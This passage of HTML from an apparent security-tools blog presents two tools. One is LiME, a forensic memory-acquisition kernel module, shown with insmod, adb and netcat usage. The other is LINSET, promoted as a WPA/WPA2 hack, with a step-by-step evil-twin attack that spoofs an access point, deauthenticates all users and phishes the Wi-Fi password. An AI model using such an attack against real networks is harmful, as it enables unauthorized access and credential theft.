       <a href="http://2.bp.blogspot.com/-v_idTTbZgcQ/VkK_v80uz0I/AAAAAAAAEyM/JUL7mGaMt0I/s1600/Lime.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-v_idTTbZgcQ/VkK_v80uz0I/AAAAAAAAEyM/JUL7mGaMt0I/s1600/Lime.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        A Loadable Kernel Module (LKM) which allows for volatile memory acquisition from Linux and Linux-based devices, such as Android. This makes LiME unique as it is the first tool that allows for full memory captures on Android devices. It also minimizes its interaction between user and kernel space processes during acquisition, which allows it to produce memory captures that are more forensically sound than those of other tools designed for Linux memory acquisition.
      </div> 
      <a name="more"></a>
      <br> 
      <span style="font-size: large;"> <b> Features </b> </span> 
      <br> 
      <ul> 
       <li> Full Android memory acquisition </li> 
       <li> Acquisition over network interface </li> 
       <li> Minimal process footprint </li> 
      </ul> 
      <br> 
      <span style="font-size: large;"> <b> Usage </b> </span> 
      <br> Detailed documentation on LiME's usage and internals can be found in the "doc" directory of the project. 
      <br> LiME utilizes the insmod command to load the module, passing required arguments for its execution. 
      <br> 
      <pre><code>insmod ./lime.ko "path=&lt;outfile | tcp:&lt;port&gt;&gt; format=&lt;raw|padded|lime&gt; [dio=&lt;0|1&gt;]"

path (required):   outfile ~ name of file to write to on local system (SD Card)
        tcp:port ~ network port to communicate over

format (required): raw ~ concatenates all System RAM ranges
        padded ~ pads all non-System RAM ranges with 0s
        lime ~ each range prepended with fixed-size header containing address space info

dio (optional):    1 ~ attempt to enable Direct IO
        0 ~ default, do not attempt Direct IO

localhostonly (optional):  1 restricts the tcp to only listen on localhost, 0 binds on all interfaces (default)
</code></pre> 
      <br> 
      <span style="font-size: large;"> <b> Examples </b> </span> 
      <br> In this example we use adb to load LiME and then start it with acquisition performed over the network 
      <br> 
      <pre><code>$ adb push lime.ko /sdcard/lime.ko
$ adb forward tcp:4444 tcp:4444
$ adb shell
$ su
# insmod /sdcard/lime.ko "path=tcp:4444 format=lime"
</code></pre> Now on the host machine, we can establish the connection and acquire memory using netcat 
      <br> 
      <pre><code>$ nc localhost 4444 &gt; ram.lime
</code></pre> Acquiring to sdcard 
      <br> 
      <pre><code># insmod /sdcard/lime.ko "path=/sdcard/ram.lime format=lime"
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><a href="https://github.com/504ensicslabs/lime" target="_blank"> </a><span style="font-size: x-large;"><a href="https://github.com/504ensicslabs/lime" target="_blank"> Download Lime</a><span id="goog_68690319"></span> </span> </b> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="6738024938584100455" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> LINSET - WPA/WPA2 Hack Without Brute Force  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-6738024938584100455" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-4XNbdl_eqoQ/VK722dhJ4rI/AAAAAAAADiA/r3DsvkYtn9o/s1600/LINSET.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-4XNbdl_eqoQ/VK722dhJ4rI/AAAAAAAADiA/r3DsvkYtn9o/s1600/LINSET.png" height="432" width="640"></a>
      </div> 
      <br> 
      <b><span class="Apple-style-span" style="font-size: large;">How it works</span></b>
      <br> 
      <ul class="task-list"> 
       <li>Scan the networks.</li> 
       <li>Select network.</li> 
       <li>Capture handshake (can be used without handshake)</li> 
       <li>We choose one of several web interfaces tailored for me (thanks to the collaboration of the users)</li> 
       <li>Mounts one FakeAP imitating the original</li> 
       <li>A DHCP server is created on FakeAP</li> 
       <li>It creates a DNS server to redirect all requests to the Host</li> 
       <li>The web server with the selected interface is launched</li> 
       <li>The mechanism is launched to check the validity of the passwords that will be introduced</li> 
       <li>It deauthentificate all users of the network, hoping to connect to FakeAP and enter the password.</li> 
       <li>The attack will stop after the correct password checking</li> 
      </ul> Are necessary tengais installed dependencies, which 
      <code>Linset</code> check and indicate whether they are installed or not.
      <br> 
      <br> It is also preferable that you still keep the 
      <strong>patch for the negative channel</strong>, because if not, you will have complications relizar to attack correctly
      <br> 
      <br> 
      <b><span class="Apple-style-span" style="font-size: large;">How to use</span></b>
      <br> 
      <pre><code>$ chmod +x linset
$ ./linset</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span class="Apple-style-span" style="font-size: x-large;"><a href="https://github.com/vk496/linset" target="_blank">Download&nbsp;LINSET</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="4087938785352396175" itemscope itemtype="http://schema.org/BlogPosting">
